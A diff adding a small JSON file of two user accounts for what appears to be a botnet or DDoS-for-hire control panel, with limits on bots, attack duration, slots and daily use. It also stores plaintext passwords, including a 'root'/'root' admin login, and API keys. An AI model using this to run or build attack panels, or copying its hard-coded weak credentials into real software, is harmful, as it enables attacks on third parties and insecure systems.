@@ -1,0 +1,28 @@
+[
+  {
+    "user": "root",
+    "pass": "root",
+    "maxTime": 3600,
+    "maxBots": 6000,
+    "maxSlots": 3,
+    "isAdmin": true,
+    "dailyLimit": 100,
+    "dailyUsed": 4,
+    "lastResetDate": "2026-01-11",
+    "apiAccess": true,
+    "apiKey": "QWERBNM"
+  },
+  {
+    "user": "api",
+    "pass": "plepqwlepwlqpd",
+    "maxTime": 1200,
+    "maxBots": 999,
+    "maxSlots": 99,
+    "isAdmin": false,
+    "dailyLimit": 999,
+    "dailyUsed": 8,
+    "lastResetDate": "2026-01-11",
+    "apiAccess": true,
+    "apiKey": "zmIRedR88zpKRMtdvTz77ZtphyEdUCZr"
+}
+]
